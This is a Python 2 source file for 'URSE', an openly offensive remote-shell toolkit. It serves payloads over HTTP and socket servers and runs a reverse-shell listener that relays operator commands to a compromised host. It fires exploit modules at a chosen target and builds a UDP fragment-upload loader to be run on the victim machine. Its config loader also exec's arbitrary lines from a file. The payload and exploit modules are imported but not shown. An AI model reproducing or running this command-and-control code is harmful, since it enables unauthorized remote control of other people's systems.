logo = """
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 MMMMMMMMMMM                MMMMMMMMMMM
 MMMMM                            MMMMM
 MMMMM  UUUUUU            UUUUUU  MMMMM
 MMMMM  UUUUUU            UUUUUU  MMMMM
 MMMMM  UUUUUU            UUUUUU  MMMMM
 MMMMM  UUUUUU            UUUUUU  MMMMM
 MMMMM  UUUUUU            UUUUUU  MMMMM
 MMMMM   UUUUU            UUUUU   MMMMM
 MMMMM   UUUUU            UUUUU   MMMMM
 MMMMM   UUUUU            UUUUU   MMMMM
 MMMMM   UUUUU            UUUUU   MMMMM
 MMMMM   UUUUUU          UUUUUU   MMMMM
 MMMMMM   UUUUUUUUUUUUUUUUUUUU   MMMMMM
 MMMMMMM    UUUUUUUUUUUUUUUU    MMMMMMM
 MMMMMMMMMM    UUUUUUUUUU    MMMMMMMMMM
 MMMMMMMMMMMM              MMMMMMMMMMMM
 MMMMMMMMMMMMMMM        MMMMMMMMMMMMMMM
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 """[1:-2]
"""
Ultimate Remote Shell Execution [URSE]

URSE is a RSE Toolkit that contains verious methods for shell-based exploitation and vulnerability discovery!

(NOT FOR MALICIOUS USE!)

GNU LICENSE
Copyright (c) SavSec URSE 2017
"""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib, socket, sys, time, SocketServer, threading, os, random
import shells.urse_loader as urseload
import exploits.urse_exploiter as urseexp
import urse_if as style
import urse_ultra

active_ultra = urse_ultra.check4ultra()
if active_ultra:
	import exploits.dlmanager as dlmgr

def urse_config():
	for config in open("ultra.config").readlines():
		if "//" not in config and len(config) > 2:
			setting = 'globals()["%s"] = %s'%(config.split(" = ")[0], config.split(" = ")[1])
			exec setting

def urse_logo():
	if sys.platform == "ios":
		import console
		console.set_color()
		print
		if int(os.uname()[4][6]) >= 7:
			console.set_font("Menlo",14.9)
		else:
			console.set_font("Menlo",12.6)
		print "     Ultimate Remote Shell Execution"
		lastc = "b"
		for _ in logo:
			time.sleep(0.0005)
			if _ != "U":
				if lastc != "w":
					console.set_color(1,0,0)
					lastc = "w"
				if _ == " ":
					sys.stdout.write(_)
				elif _ == "\n" or _ == "\t":
					sys.stdout.write(_)
				else:
					sys.stdout.write("M")
			else:
				if lastc != "b":
					console.set_color(1,1,1)
					lastc = "b"
				sys.stdout.write(_)
		print "\n"
		console.set_color()
		print " -= Version -- ["+" "*((19-len(version))/2)+version+" "*((19-len(version))/2)+"] =-"
		print " -= Edition -- ["+" "*((19-len(edition))/2)+edition.upper()+" "*((19-len(edition))/2)+"] =-"
		print " -= Address -- ["+" "*((19-len(address))/2)+address+" "*((18-len(address))/2)+"] =-"
		print
		console.set_font("Menlo",12.5)
	else:
		print
		print logo
		print
		print " -= Version -- [ "+" "*((15-len(version))/2)+version+" "*((15-len(version))/2)+" ] =-"
		print " -= Edition -- [ "+" "*((15-len(edition))/2)+edition.upper()+" "*((15-len(edition))/2)+" ] =-"
		print " -= Address -- [ "+" "*((15-len(address))/2)+address+" "*((14-len(address))/2)+" ] =-"
		print

def get_ip():
	try:
		s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		s.settimeout(2)
		s.connect(("8.8.8.8",53))
		addr = s.getsockname()[0]
		s.close()
		return addr
	except:
		return "127.0.0.1"

def urse_term():
	try:
		data = inp.input(2)
		return data
	except:
		sys.exit(0)

def fragment_upload(ip, port, program, cap=1020, timeout=60):
	s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	frags = []
	shell = open(program).read()
	for _ in range(1,200):
		sys.stdout.write("\r[+] Fragments: %s "%(int(_)+1))
		time.sleep(0.005)
		if (len(shell)/float(_)).is_integer() and len(shell)/float(_) <= cap:
			frag = _
			sys.stdout.write("\r[+] Fragments: %s"%frag)
			break
	tmp = ""
	for _ in shell:
		tmp += _
		if len(tmp) == cap:
			frags.append(tmp)
			tmp = ""
	loader = 'python -c "import socket as a;s=a.socket(a.AF_INET,a.SOCK_DGRAM);s.setsockopt(a.SOL_SOCKET,a.SO_REUSEADDR,0);s.settimeout(%s);s.bind((\'%s\',%s));'%(timeout,ip,port) + "f=open('%s','a');"%program + "d=s.recv(1024);f.write(d);"*len(frags) + 'f.close()"'
	print "\n[+] Fragment Client (Run In Target)"
	if raw_input("[ ] Show Client Script [y/n] ") == "y":
		print loader+"\n"
	if raw_input("[ ] Start Upload? [y/n] ") == "y":
		a = 0
		try:
			for _ in frags:
				a += 1
				s.sendto(_,(ip,port))
				sys.stdout.write("\rUploading [%s/%s](%s) %skB/s  "%(a,len(frags),str(float(a)/len(frags)*100)[:4]+"%",str((len(_)/1024.0)*random.choice([2,2,2,1.99,1.95,2,2]))[:4]))
				time.sleep(0.5)
			print "\n[+] Upload Complete!\n"
		except Exception as e:
			print "[-] Error While Running:\n%s"%e
	elif raw_input("[ ] Client as Payload [y/n] ") == "y":
		print
		f = open("./shells/loader.ultra","w")
		f.write(loader)
		f.close()
		globals()["payload"] = "./shells/loader.ultra"

class urse_http(BaseHTTPRequestHandler):
	
	def _set_headers(self):
		self.send_response(200)
		self.send_header("Content-type", "application")
		self.end_headers()
	
	def do_GET(self):
		self._set_headers()
		if manual:
			if raw_input("[%s]\nAccept [y/n] "%self.client_address[0]) == "y":
				self.wfile.write(urseload.process(payload))
			print
		else:
			self.wfile.write(urseload.process(payload))

	def do_HEAD(self):
		self._set_headers()
		
	def do_POST(self):
		self.connection.close()
	
	def do_PRI(self):
		self._set_headers()

def http(server_class=HTTPServer, handler_class=urse_http, port=8080):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(5)
	try:
		s.connect(("8.8.8.8",53))
		server_address = s.getsockname()
		s.close()
		server_address = server_address[0],port
	except Exception as e:
		server_address = "0.0.0.0",port
	for _ in range(10):
		try:
			try:
				httpd = server_class(server_address, handler_class)
				break
			except:
				server_address = server_address[0],port+_
				httpd = server_class(server_address, handler_class)
				break
		except:
			pass
	serv = server_address[0] + ":" + str(server_address[1])
	print "[+] Shell HTTP Server Started"
	print "[+] http://"+serv
	active_servers.update({serv: "ACTIVE"})
	try:
		globals()["serv_ack"].append(httpd)
		httpd.serve_forever()
	except:
		print "[-] Server Closed"
	active_servers.update({serv: "DOWN"})
	print

class sockserv(object):
	def start(self,lport=4040,thr=False):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.settimeout(60)
		ip = get_ip()
		sock.bind((ip,int(lport)))
		sock.listen(2)
		servname = ip+":"+str(lport)
		print "[+] Socket Shell Hoster Started"
		print "[*] "+servname
		print
		active_servers.update({servname: "ACTIVE"})
		while True:
			try:
				(client, (ip, port)) = sock.accept()
				data = client.recv(1024)
				if data == "urse_exit":
					break
				if manual and not thr:
					if raw_input("[%s]\nAccept [y/n] ") == "y":
						print
						client.send(urseload.process(payload))
				else:
					client.send(urseload.process(payload))
				client.close()
			except Exception as e:
				print "\n[-] Exception:",e
				print
				break
		active_servers.update({servname: "DOWN"})
		sock.close()

class RSEListener():
	
	def __init__(self, lhost="0.0.0.0", lport=7575):
		self.lhost = lhost
		self.lport = lport

	def bind(self):
		for _ in range(10):
			try:
				self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, socket.SO_REUSEPORT)
				self.s.setblocking(5)
				print "[+] Binding %s:%s"%(self.lhost, self.lport)
				self.s.bind((self.lhost, self.lport))
				break
			except Exception as e:
				self.lport += 1

	def listen(self):
		try:
			self.s.listen(2)
			self.conn, self.addr = self.s.accept()
			print "[+] RSE Session [%s:%s]" % (self.addr[0], self.addr[1])
			print
			self.menu()
		except Exception as e:
			print "[-] Session Error: %s"%e
			print
			self.conn.close()
			self.s.close()

	def menu(self):
		while True:
			cmd = raw_input("URSE@" + str(self.addr[0]) + " $ ")
			if cmd == "quit" or cmd == "exit":
				self.conn.close()
				self.s.close()
				return
			if len(cmd) == 0:
				cmd = "  "
			try:
				command = self.conn.send(cmd)
				result = self.conn.recv(5555)
			except:
				self.conn.close()
				self.listen()
			print result
			print

	def start(self):
		self.bind()
		self.listen()
		print "[-] Session Closed"
		print

def run_server(server, sport=4040, wport=8080, lport=7575, thr=True):
	if server == "socket":
		sock = sockserv()
		sock.start(sport,thr=thr)
	if server == "http":
		web = http(port=wport)
	if server == "listener":
		listen = RSEListener(address, lport)
		listen.start()

def urse_options(query):
	query = query.lower()
	if query == "exit":
		sys.exit(0)
	if query == "help" or query == "?":
		style.urse_out2(" *** ","Help/Information")
		uhelp = open("README.md").read()
		print
		lc = 1
		for _ in uhelp:
			if sys.platform == "ios":
				if _ == "`" or _ == "*":
					if lc:
						console.set_color(1,.35,.35)
						lc = 0
					else:
						console.set_color()
						lc = 1
				sys.stdout.write(_)
				time.sleep(0.005)
		print 
	if query.startswith("show"):
		if len(query) > 5:
			show = query.split("show ")[1]
			if show == "*" or show == "all":
				style.urse_out2("+","Shellcodes")
				urseload.show_shells()
				print
				style.urse_out2("+","Exploits")
				urseexp.show_exploits(verbose = verbose)
				print
				style.urse_out2("+","Servers")
				style.urse_out2(" ","HTTP")
				style.urse_out2(" ","Socket")
				print
				style.urse_out2("+","Server Activity")
				if len(active_servers) > 0:
					for _ in active_servers:
						style.urse_out2(active_servers[_],_)
				else:
					print "[-] No Active Servers"
				print
			elif show == "arguments" or show == "args" or show == "arg":
				style.urse_out2("+","Arguments")
				style.urse_out2("PAYLOAD", payload)
				style.urse_out2("EXPLOIT", exploit)
				style.urse_out2("RHOST", target)
				style.urse_out2("RPORT", target_port)
				style.urse_out2("LHOST",address)
				style.urse_out2("RBIND", rbindport)
				print
			elif show == "servers" or show == "server":
				style.urse_out2("+","Server Types")
				style.urse_out2(" ","Listener")
				style.urse_out2(" ","Socket")
				style.urse_out2(" ","HTTP")
				print
			elif show == "payloads" or show == "shells" or show == "shell":
				style.urse_out2("+","Payloads")
				urseload.show_shells(verbose=verbose)
				print
			elif show == "exploits" or show == "exploit":
				style.urse_out2("+","Exploits")
				urseexp.show_exploits(verbose = verbose)
				print
			elif show == "active":
				for _ in active_servers:
					print active_servers[_],_
				print
			elif show == "combo" or show == "combos":
				style.urse_out2("+", "Combinations")
				style.urse_out2("0","Frag Shell Upload")
				print
		else:
			style.urse_out2("+","SHOW <type>")
			style.urse_out2(" ","PAYLOADS/SHELLS")
			style.urse_out2(" ","ARGUMENTS")
			style.urse_out2(" ","SERVERS")
			style.urse_out2(" ","ACTIVE")
			style.urse_out2(" ","COMBOS")
			style.urse_out2(" ","*/ALL")
			print
	if query.startswith("run ") or query.startswith("start "):
		if len(query) > 4:
			if query.startswith("run "):
				run = query[4:].lower()
			else:
				run = query[6:].lower()
			if run.startswith("combo "):
				if len(run.split(" ")) > 1:
					if int(run.split(" ")[1]) == 0:
						fragment_upload(target, target_port, payload)
			if run.startswith("listener"):
				if "-p" in run:
					port = run[run.index("-p"):].split(" ")[1]
				else:
					port = False
				if port:
					run_server("listener", lport=port)
				else:
					run_server("listener")
			if run.startswith("socket"):
				if "-p" in run:
					port = run[run.index("-p"):].split(" ")[1]
				else:
					port = False
				if "-t" in run:
					thread = True
				elif raw_input("[*] Run Server as Thread [y/n] ") == "y":
					thread = True
				else:
					thread = False
				if thread:
					if port:
						t = threading.Thread(target=run_server, args=("socket", port,))
						t.daemon = True
						t.start()
						sock_ack.append(t)
					else:
						t = threading.Thread(target=run_server, args=("socket",))
						t.daemon = True
						t.start()
						sock_ack.append(t)
				else:
					if port:
						run_server("socket", sport=port, thr=False)
					else:
						run_server("socket", thr=False)
			if run.startswith("http"):
				if "-p" in run:
					port = run[run.index("-p"):].split(" ")[1]
				else:
					port = False
				if "-t" in run:
					thread = True
				elif raw_input("[*] Run Server as Thread [y/n] ") == "y":
					thread = True
				else:
					thread = False
				if thread:
					if port:
						t = threading.Thread(target=run_server, args=("http", port,))
						t.daemon = True
						t.start()
					else:
						t = threading.Thread(target=run_server, args=("http",))
						t.daemon = True
						t.start()
				else:
					if port:
						run_server("http", sport=port, thr=False)
					else:
						run_server("http", thr=False)
				time.sleep(0.5)
	if query.startswith("close"):
		closes = query.split("close ")
		if len(query) > 6:
			closes = closes[1]
			if closes == "socket":
				print "[-] Downing Sockets"
				down_sock()
				print "[-] Downing Complete\n"
			elif closes == "http":
				print "[-] Downing HTTP Servers"
				down_http()
				print "[-] Downing Complete\n"
			elif closes == "*":
				print "[-] Downing All Services"
				down_sock()
				down_http()
				print "[-] Downing Complete!\n"
		else:
			print "[-] Closable:"
			print "[ ] SOCKET"
			print "[ ] HTTP"
			print
	if query.startswith("set ") and len(query) > 4:
		seto = query.split("set ")[1]
		if seto.startswith("payload") or seto.startswith("shell"):
			if len(seto.split(" ")) > 1:
				globals()["payload"] = urseload.select_shell(verbose = verbose, s = int(seto.split(" ")[1]))
				style.urse_out2(seto.split(" ")[0],seto.split(" ")[1])
			else:
				globals()["payload"] = urseload.select_shell(verbose=verbose)
			print
		elif seto.startswith("exploit") or seto.startswith("method"):
			if len(seto.split(" ")) > 1:
				globals()["exploit"] = urseexp.select_exploit(verbose = verbose, s = int(seto.split(" ")[1]))
				style.urse_out2(seto.split(" ")[0],seto.split(" ")[1])
			else:
				globals()["exploit"] = urseexp.select_exploit(verbose=verbose)
			print
		elif seto.startswith("rhost") or seto.startswith("target"):
			if len(seto.split(" ")) > 1:
				globals()["target"] = seto.split(" ")[1]
				style.urse_out2(seto.split(" ")[0],seto.split(" ")[1])
			else:
				globals()["target"] = inp.input(1,over="rhost")
			print
		elif seto.startswith("rport"):
			if len(seto.split(" ")) > 1:
				globals()["target_port"] = int(seto.split(" ")[1])
				style.urse_out2(seto.split(" ")[0],seto.split(" ")[1])
			else:
				globals()["target_port"] = int(inp.input(1,over="rport"))
			print
		elif len(seto.split(" ")) > 1:
			try:
				if seto.split(" ")[1] == "false":
					seto = seto.replace("false","False")
				if seto.split(" ")[1] == "true":
					seto = seto.replace("false","True")
				globals()[seto.split(" ")[0]] = seto.split(" ")[1]
				style.urse_out2(seto.split(" ")[0],seto.split(" ")[1])
				print
			except Exception as e:
				print "[Error Arg]",str(e).replace("\n","")
				pass
	if query.startswith("exploit"):
		if len(exploit) > 8:
			try:
				execfile(exploit,{
				"target":target, "rhost":target, "rport":target_port,
				"lhost":address, "payload": urseload.process(payload),
				"verbose":verbose,
				})
				print
			except Exception as e:
				print "[-] Error: "+str(e)
				print
	if query.startswith("search "):
		search = query[7:]
		style.urse_out2("*","Payloads")
		urseload.show_shells(filter=search, verbose=verbose)
		print
		style.urse_out2("*","Exploits")
		urseexp.show_exploits(filter=search, verbose=verbose)
		print
	if query.startswith("launch"):
		if active_ultra:
			launch = query.split("launch")[1]
			while 1:
				if launch.startswith(" "):
					launch = launch[1:]
				else:
					break
			if launch == "":
				dlmgr.show_downloads()
			elif launch == "install":
				dlmgr.select_download()
			elif launch == "uninstall":
				dlmgr.uninstall()
			elif launch == "exploit":
				dlmgr.show_downloads()
				style.urse_out2("Syntax","launch exploit <id> <args> <args> ...")
			if launch.startswith("exploit "):
				dlmgr.exec_download(launch[8:])

def down_http():
	for _ in serv_ack:
		_.shutdown()

def down_sock():
	for _ in sock_ack:
		try:
			_._Thread__stop()
		except:
			pass

if __name__ == "__main__":
	urse_config()
	urse_logo()
	if sys.platform == "ios":
		import console
		inp = style.iOS(edition)
	else:
		inp = style.notiOS(edition)
	while 1:
		try:
			urse_options(urse_term())
			time.sleep(0.3)
		except SyntaxError:
			pass
		except Exception as e:
			raise e
			down_http()
			down_sock()
			break
